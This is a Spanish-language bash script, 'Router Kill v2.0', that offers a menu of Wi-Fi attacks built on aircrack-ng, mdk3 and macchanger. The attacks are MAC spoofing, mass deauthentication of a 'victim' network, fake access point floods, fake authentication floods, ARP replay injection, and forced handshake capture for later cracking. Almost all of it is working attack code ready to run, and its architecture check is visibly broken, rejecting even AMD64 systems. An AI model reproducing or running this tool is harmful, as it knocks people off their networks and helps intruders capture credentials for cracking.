#!/bin/bash

#Author: Facu Salgado parte del codigo esta hecho por Hacking.con.H

# trap ctrl-c and call ctrl_c()
trap ctrl_c INT

s="s"


#Colors
white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
nc="\e[0m"
mon="mon"


function ctrl_c() {
echo -e "$nc($blue*$nc)$green Presionaste la tecla$red CTRL + C$green Saliendo del Programa.."
sleep 2
echo -e "$nc($blue*$nc)$green Detiendo modo monitor en 1 segundo..$nc"
sleep 1
airmon-ng stop wlan0mon
airmon-ng stop eth0mon
echo -e "$nc($blue*$nc)$green Modo monitor detenido..$nc"
echo -e "$nc($blue*$nc)$green Gracias por usar nuestro Script $blue by Facu Salgado..$nc"
sleep 1
exit

}


case `dpkg --print-architecture` in
aarch64)
echo -e "$red(error)$blue el script solo soporta arquitectura$red AMD 64$blue Sistemas debian y deribados [$red✗$nc]"
exit
;;
arm)
echo -e "$red(error)$blue el script solo soporta arquitectura$red AMD 64$blue Sistemas debian y deribados [$red✗$nc]"
exit
;;
armhf)
echo -e "$red(error)$blue el script solo soporta arquitectura$red AMD 64$blue Sistemas debian y deribados [$red✗$nc]"
exit
;;

i*86)
echo -e "$red(error)$blue el script solo soporta arquitectura$red AMD 64$blue Sistemas debian y deribados [$red✗$nc]"
exit
;;
x86_64)
echo -e "$red(error)$blue el script solo soporta arquitectura$red AMD 64$blue Sistemas debian y deribados [$red✗$nc]"
exit
;;
esac




#Opciones menu

a="Deauth"
b="Flood Fake Acess Point"
c="Fake Auth"
new="Inject Packets"
d="Detener Monitor Mode"
e="Capturar Handshake"
update="Update Program"
f="Salir"

#directory verification
directory=$(pwd)

#verificacion de Dependencias by Hacking.con.H

#root privilegies
if [[ $EUID -ne 0 ]]; then	
echo "														         "
echo "(✗) No eres usuario root, para ejecutar la heramienta tienes que ejecutarla siendo root (✗)      "				  
echo "(✗) You are not a root user, to run the tool you have to run it as root (✗)              "		
exit 1
fi

#airmon-ng
if which airmon-ng >/dev/null; then
sleep 0.25
echo -e "$blue(AIRMONG-NG)$nc ................................................... Instalado [$green✓$nc]"
else
sleep 0.25
echo -e "$red(AIRMONG-NG)$nc No instalado [$red✗$nc]"
sleep 1
echo "Instala escribiendo [sudo apt-get install airckrack-ng]"
sleep 0.25
exit 1
fi

if which airodump-ng >/dev/null; then
sleep 0.25
echo -e "$blue(AIRODUMP-NG)$nc .................................................. Instalado [$green✓$nc]"
else
sleep 0.25
echo -e "$red(AIRODUMP-NG)$nc No instalado [$red✗$nc]"
sleep 1
echo "Instala escribiendo [sudo apt-get install airckrack-ng]"
exit 1
fi

if which mdk3 >/dev/null; then
sleep 0.25
echo -e "$blue(MDK3)$nc ......................................................... Instalado [$green✓$nc]"
sleep 0.25
else
sleep 0.25
echo -e "$red(MDK3)$nc  No instalado [$red✗$nc]"
sleep 1
echo "Clona y instala Mdk3 en [https://github.com/wi-fi-analyzer/mdk3-master]."
exit 1
fi

#macchanger
if which macchanger >/dev/null; then
sleep 0.25
echo -e "$blue(MACCHANGER)$nc ................................................... Instalado [$green✓$nc]"
sleep 0.25
else
sleep 0.25
echo -e "$red(macchanger)$nc  No instalado [$red✗$nc]"
sleep 1
echo "Instala escribiendo [sudo apt-get install macchanger]."
exit 1
fi

if which toilet >/dev/null; then
sleep 1
echo -e "$blue(Toilet)$nc ................................................... Instalado [$green✓$nc]"
else
sleep 1
echo -e "$red(Toilet)$nc No instalado [$red✗$nc]"
sleep 1
echo "Instala escribiendo [sudo apt-get install toilet]"
sleep 1
exit 1
fi

#mensaje y logo bienvenida
clear
toilet --filter border Router Kill | lolcat
echo
echo -e "$purple(*)$blue Router Kill$red v2.0$blue"
sleep 2
echo -e "$purple(*)$blue Script creado por$red Facu Salgado"
sleep 1
echo -e "$purple(*)$blue Regalanos una estrella en github$yellow"

export PS3=$'\e[01;35m(*)\e[01;32m Elige una Opcion:\e[01;33m '


#menu principal

function menu_principal(){
echo
echo
select menu in "$a" "$b" "$c" "$new" "$d" "$e" "$update" "$f";
do
case $menu in 

$a)
echo -e "$nc($blue*$nc)$green Este Ataque desautenticara todos los clientes dentro de la red"
sleep 2
echo -e "$nc($blue*$nc)$green le mostraremos sus interfaces de red disponibles"
sleep 2
echo
echo
ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d'
sleep 1
echo -e "$green"
read -p "EScriba su interfaz ➜ " interface
#cambio de dirección mac
echo -e "$nc($blue*$nc)$green A continuacion daremos de baja tu interfaz para falsificar tu MAC"
sleep 2
ifconfig $interface down
echo -e "$nc($blue*$nc)$green Falsificando tu MAC!!"
sleep 2
macchanger -r $interface
ifconfig $interface up
echo -e "$nc($blue*$nc)$green TU direccion MAC fue falsificada correctamente!!"
sleep 2
echo -e "$nc($blue*$nc)$green Ahora iniciaremos el modo monitor en tu interfaz"
sleep 2
airmon-ng start $interface
pkill dhclient && pkill wpa_supplicant
echo -e "$nc($blue*$nc)$green Modo monitor iniciado correctamente"
sleep 2
echo -e "$nc($blue*$nc)$green Ahora haremos un analisis de las redes disponibles"
sleep 2
echo -e "$nc($blue*$nc)$red AVISO: Espera 10 segundos$green cuando inicie el analisis"
sleep 9
timeout --foreground 12s airodump-ng $interface$mon
echo
echo -e "$green"
read -p "añade el BSSID victima ➜ " bssid
sleep 2
read -p "añade el CANAL de la red (CH) ➜ " ch
sleep 2
read -p "Añade el nombre en txt para guardar el BSSID ➜ " doc
echo $bssid > $doc
sleep 2
read -p "Añade la duracion del ataque en segundos ➜ " sec
sleep 2
echo -e "$nc($blue*$nc)$green El ataque sera realizado al BSSID:$blue $bssid $green En el Canal: $ch"
sleep 2
echo -e "$nc($blue*$nc)$green el ataque Iniciara en 5 segundos.."
sleep 1
echo "4 segundos.."
sleep 1
echo "3 segundos.."
sleep 1
echo "2 segundos.."
sleep 1
echo "1 segundo"
sleep 1
echo -e "$nc($blue*$nc)$red Ataque Iniciado..$green Tiempo restante de ataque:$blue $sec$green Segundos $nc"
timeout --foreground $sec$s mdk3 $interface$mon d -b $doc -c $ch
echo -e "$nc($blue*$nc)$green el ataque ha Finalizado..$yellow"
sleep 2
echo -e "$nc($blue*$nc)$green Deteniendo modo monitor$yellow"
sleep 2
airmon-ng stop $interface$mon
menu_principal
;;

$b)


echo -e "$nc($blue*$nc)$green Este Ataque Creara un flood de redes WIFI"
sleep 2
echo -e "$nc($blue*$nc)$green le mostraremos sus interfaces de red disponibles"
sleep 2
echo
echo
ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d'
sleep 1
echo -e "$green"
read -p "EScriba su interfaz ➜ " interface
sleep 2
echo -e "$nc($blue*$nc)$green Ahora iniciaremos el modo monitor en tu interfaz"
sleep 2
airmon-ng start $interface
pkill dhclient && pkill wpa_supplicant
echo -e "$nc($blue*$nc)$green Modo monitor iniciado correctamente"
echo -e "$green"
read -p "EScriba tiempo de ataque en segundos ➜ " sec
sleep 2
echo -e "$nc($blue*$nc)$green El ataque comenzara en 5 segundos.."
sleep 1
echo "4 segundos"
sleep 1
echo "3 segundos"
sleep 1
echo "2 segundos"
sleep 1
echo "1 segundos"
sleep 1
echo -e "$nc($blue*$nc)$red ATAQUE INICIADO..$green Tiempo restante de ataque:$blue $sec$green Segundos $nc"
timeout --foreground $sec$s mdk3 $interface$mon b
echo -e "$nc($blue*$nc)$green el ataque ha Finalizado..$yellow"
sleep 2
echo -e "$nc($blue*$nc)$green Deteniendo modo monitor$yellow"
sleep 2
airmon-ng stop $interface$mon
menu_principal
;;


$c)

echo -e "$nc($blue*$nc)$green Este Ataque realizara un flood de intentos de conexion al router"
sleep 2
echo -e "$nc($blue*$nc)$green le mostraremos sus interfaces de red disponibles"
sleep 2
echo
echo
ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d'
sleep 1
echo -e "$green"
read -p "EScriba su interfaz ➜ " interface
airmon-ng start $interface
pkill dhclient && pkill wpa_supplicant
echo -e "$nc($blue*$nc)$green Modo monitor iniciado correctamente"
sleep 2
echo -e "$nc($blue*$nc)$green Ahora haremos un analisis de las redes disponibles"
sleep 2
echo -e "$nc($blue*$nc)$red AVISO: Espera 20 segundos$green cuando inicie el analisis"
sleep 9
timeout --foreground 20s airodump-ng $interface$mon
echo -e "$green"
read -p "añade el BSSID victima ➜ " bssid
	echo -e "$white"
	echo -e "$bssid" [$green✓$nc]
	echo -e "$green"
read -p "Añade el nombre en txt para guardar el BSSID ➜ " doc
	echo -e "$nc"
	echo $bssid > $doc
	echo -e "$green"
read -p "añade el CANAL de BSSID victima ➜ " ch
	echo -e "$white"
	echo -e "$ch" [$green✓$nc]
	echo -e "$green"
read -p "añade el ESSID victima ➜ " essid
	echo -e "$white"
	echo -e "$essid" [$green✓$nc]
	sleep 1
	read -p "Añade la duracion del ataque en segundos ➜ " sec
        sleep 2
	echo -e "$nc($blue*$nc)$green El ataque comenzara en 5 segundos.."
sleep 1
echo "4 segundos"
sleep 1
echo "3 segundos"
sleep 1
echo "2 segundos"
sleep 1
echo "1 segundos"
sleep 1
echo -e "$nc($blue*$nc)$red Ataque Iniciado..$green Tiempo restante de ataque:$blue $sec$green Segundos $nc"
sleep 2
timeout --foreground $sec$s mdk3 $interface$mon a -a $doc
echo -e "$nc($blue*$nc)$green el ataque ha Finalizado..$yellow"
sleep 2
echo -e "$nc($blue*$nc)$green Deteniendo modo monitor$yellow"
sleep 2
airmon-ng stop $interface$mon
menu_principal



;;










$new)

echo -e "$nc($blue*$nc)$green Este Ataque realizara un flood de intentos de conexion al router"
sleep 2
echo -e "$nc($blue*$nc)$green le mostraremos sus interfaces de red disponibles"
sleep 2
echo
echo
ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d'
sleep 1
echo -e "$green"
read -p "EScriba su interfaz ➜ " interface
echo -e "$nc($blue*$nc)$green Modificaremos su direccion MAC"
ifconfig $interface down
macchanger -r $interface
val=$(ifconfig $interface | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}')
echo -e "$nc($blue*$nc)$green Direccion MAC falsificada"
sleep 2
echo -e "$nc($blue*$nc)$green Iniciando modo monitor.."
sleep3
airmon-ng start $interface
pkill dhclient && pkill wpa_supplicant
echo -e "$nc($blue*$nc)$green Modo monitor iniciado correctamente"
sleep 2
echo -e "$nc($blue*$nc)$green Ahora haremos un analisis de las redes disponibles"
sleep 2
echo -e "$nc($blue*$nc)$red AVISO: Espera 20 segundos$green cuando inicie el analisis"
sleep 9
timeout --foreground 20s airodump-ng $interface$mon
echo -e "$green"
read -p "añade el BSSID victima ➜ " bssid
	echo -e "$white"
	echo -e "$bssid" [$green✓$nc]
	echo -e "$green"
	read -p "Añade el canal de la red (CH) ➜ " ch
	read -p "Añade la duracion del ataque en segundos ➜ " sec
        sleep 2
        
	echo -e "$nc($blue*$nc)$green El ataque comenzara en 5 segundos..."
sleep 1
echo "4 segundos"
sleep 1
echo "3 segundos"
sleep 1
echo "2 segundos"
sleep 1
echo "1 segundos"
sleep 1
echo -e "$nc($blue*$nc)$red Ataque Iniciado..$green Tiempo restante de ataque:$blue $sec$green Segundos $nc"
sleep 2
timeout --foreground $sec$s xterm -hold -e "airodump-ng --bssid $bssid -c $ch  $interface$mon" & 
sleep 1
timeout --foreground $sec$s  xterm -hold -e "aireplay-ng --fakeauth 2 -a $bssid -c $val $interface$mon" &
sleep 1
timeout --foreground $sec$s  xterm -hold -e "aireplay-ng --arpreplay -b $bssid -h $val $interface$mon"
echo -e "$nc($blue*$nc)$green el ataque ha Finalizado..$yellow"
sleep 2
echo -e "$nc($blue*$nc)$green Deteniendo modo monitor$yellow"
sleep 2
airmon-ng stop $interface$mon
menu_principal


;;

$d)

echo -e "$nc($blue*$nc)$green le mostraremos sus interfaces de red disponibles"
sleep 2
echo -e "$nc($blue*$nc)$green Escriba la interfaz que se encuentre en modo monitor"
echo
echo
ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d'
sleep 1
echo -e "$green"
read -p "EScriba la interfaz ➜ " interface
echo -e "$nc($blue*$nc)$green Deteniendo modo monitor en 3"
sleep 1
echo "2"
sleep 1
echo "1"
sleep 1
airmon-ng stop $interface
echo -e "$nc($blue*$nc)$green Modo monitor detenido.. saliendo$nc"
exit

;;

$e)

echo -e "$nc($blue*$nc)$green Este Ataque capturara un handshake de una RED"
sleep 2
echo -e "$nc($blue*$nc)$green Les mostraremos sus interfaces disponibles"
sleep 2
ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d'
sleep 1
echo -e "$green"
read -p "EScriba la interfaz ➜ " interface
echo -e "$nc($blue*$nc)$green Ahora iniciaremos el modo monitor en tu interfaz"
sleep 2
airmon-ng start $interface
pkill dhclient && pkill wpa_supplicant
echo -e "$nc($blue*$nc)$green Modo monitor iniciado correctamente"
sleep 2
echo -e "$nc($blue*$nc)$green Ahora haremos un analisis de las redes disponibles"
sleep 2
echo -e "$nc($blue*$nc)$red AVISO: Espera 25 segundos$green cuando inicie el analisis"
sleep 9
timeout --foreground 25s airodump-ng $interface$mon
echo
echo -e "$green"
read -p "añade el BSSID victima ➜ " bssid
sleep 2
read -p "añade el CANAL de la red (CH) ➜ " ch
sleep 2
read -p "Añade el nombre del para el archivo pcap ➜ " doc
echo $bssid > $doc
sleep 2
read -p "Añade la duracion del ataque(deauth) en segundos ➜ " sec
sleep 2
echo -e "$nc($blue*$nc)$green El ataque sera realizado al BSSID:$blue $bssid $green En el Canal: $ch"
sleep 2
echo -e "$nc($blue*$nc)$green el ataque Iniciara en 5 segundos.."
sleep 1
echo "4 segundos.."
sleep 1
echo "3 segundos.."
sleep 1
echo "2 segundos.."
sleep 1
echo "1 segundo"
sleep 1
timeout --foreground 2s airodump-ng --bssid $bssid -c $ch $interface$mon
echo -e "$nc($blue*$nc)$green ejecutando xterm en 5 segundos.."
sleep 5
timeout --foreground 30s xterm -hold -e "aireplay-ng --deauth 0 -a $bssid $interface$mon" & 
timeout --foreground 60s xterm -hold -e "airodump-ng -w handshake/$doc.cap --bssid $bssid -c $ch $interface$mon" 
echo -e "$nc($blue*$nc)$green El handshake fue capturado exitosamente PATH:$blue handshake/$doc.cap"
sleep 4
echo -e "$nc($blue*$nc)$green el ataque ha Finalizado..$yellow"
sleep 2
echo -e "$nc($blue*$nc)$green Deteniendo modo monitor$yellow"
sleep 2
airmon-ng stop $interface$mon
menu_principal



;;

$update)

if [ -e $directory/routerkill.sh ]
then
rm $directory/routerkill.sh
fi
echo -e "$nc($blue*$nc)$green Actualizando programa.. en 5 segundos.."
sleep 5
curl https://raw.githubusercontent.com/byteSalgado/router-kill/master/routerkill.sh > routerkill.sh
echo -e "$nc($blue*$nc)$green Programa Actualizado.. vuelva a ejecutarlo nuevamente.."
sleep 3
exit
;;
$f)

airmon-ng stop wlan0mon
airmon-ng stop eth0mon
echo -e "$nc($blue*$nc)$green Modo monitor detenido..$nc"
echo -e "$nc($blue*$nc)$green Gracias por usar nuestro Script $blue by Facu Salgado..$nc"
sleep 1
exit
;;


*)
echo -e "$red(ERROR)$green Opcion no valida $nc"
;;
esac 
done
}
menu_principal
